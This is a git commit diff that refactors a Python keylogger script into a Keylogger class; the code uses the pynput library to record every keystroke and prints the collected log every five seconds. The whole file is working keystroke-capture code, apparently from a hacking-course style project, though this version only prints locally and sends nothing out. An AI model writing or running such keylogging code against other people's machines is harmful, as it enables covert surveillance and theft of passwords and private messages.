f2b50321ef8a80b69b968f63d54c33b61fac56ef
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-03 12:38:31 +0530

    Creating a keylogger class

--- keylogger.py
+++ keylogger.py
@@ -1,29 +1,29 @@
 #!/usr/bin/env python
 import pynput.keyboard  # allows us to monitor mouse and keyboard
 import threading
-
 log = ""
 
-def process_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        else:
-            log = log + " " + str(key) + " "
+class Keylogger:
+    def process_key_press(self, key):
+        global log
+        try:
+            log = log + str(key.char)
+        except AttributeError:
+            if key == key.space:
+                log = log + " "
+            else:
+                log = log + " " + str(key) + " "
 
-def report():
-    global log
-    print(log)
-    log = " "
-    timer = threading.Timer(5, report)
-    timer.start()
+    def report(self):
+        global log
+        print(log)
+        log = " "
+        timer = threading.Timer(5, self.report)
+        timer.start()
 
-
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
-with keyboard_listener:
-    report()
-    keyboard_listener.join()    # starting the listener
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()    # starting the listener
 
